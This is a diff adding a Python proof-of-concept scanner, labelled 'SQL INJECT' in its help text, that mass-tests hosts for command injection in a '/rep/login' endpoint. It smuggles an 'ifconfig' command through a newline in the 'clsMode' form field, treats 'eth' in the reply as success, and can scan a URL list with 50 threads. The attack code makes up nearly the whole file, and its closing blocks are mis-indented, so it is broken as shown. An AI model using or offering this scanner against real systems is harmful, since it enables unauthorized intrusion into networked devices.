@@ -1,0 +1,71 @@
+#导包
+import requests
+import re
+import sys
+import argparse
+from multiprocessing.dummy import Pool
+import urllib3
+urllib3.disable_warnings()
+
+def banner():
+    ico = """
+.------..------..------..------..------.
+|L.--. ||A.--. ||O.--. ||L.--. ||I.--. |
+| :/\: || (\/) || :/\: || :/\: || (\/) |
+| (__) || :\/: || :\/: || (__) || :\/: |
+| '--'L|| '--'A|| '--'O|| '--'L|| '--'I|
+`------'`------'`------'`------'`------'
+
+    """
+    print(ico)
+
+def main():
+    banner()
+    parser = argparse.ArgumentParser(description='SQL INJECT')
+    parser.add_argument('-u', '--url', dest='url', type=str, help='单个URL')
+    parser.add_argument('-f', '--file', dest='file', type=str, help='批量URL文件')
+    args = parser.parse_args()
+
+    if args.url:
+        poc(args.url)
+    elif args.file:
+        url_list = []
+        with open(args.file, 'r', encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp = Pool(50)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
+#寻找响应包中独有的字段最为判断条件：eth
+def poc(target):
+    api='/rep/login'
+    head={'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/116.0',
+    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'Content-Type':'application/x-www-form-urlencoded',
+    'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+    'Accept-Encoding':'gzip,deflate',
+    'Upgrade-Insecure-Requests':'1',
+    'Sec-Fetch-Dest':'document',
+    'Sec-Fetch-Mode':'navigate',
+    'Sec-Fetch-Site':'none',
+    'Sec-Fetch-User':'?1',
+    'Te':'trailers',
+    'Connection':'close',
+    'Content-Length':'128',}
+    data='clsMode=cls_mode_login%0Aifconfig%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
+    try:
+        res=requests.post(url=target+api,headers=head,data=data,verify=False,timeout=6)
+        if res.status_code==200 and 'eth' in res.text:
+          print(f"[+]{target}    存在漏洞！！！！")
+                      # with open('result.txt','a') as fp:
+                      #     fp.write(target+'\n')
+                  else:
+                      print(f"[-]{target}    不存在漏洞")
+              except:
+                   print(f"[-]{target}    请求出现异常")
+              
+    if __name__ == '__main__':
+              main()
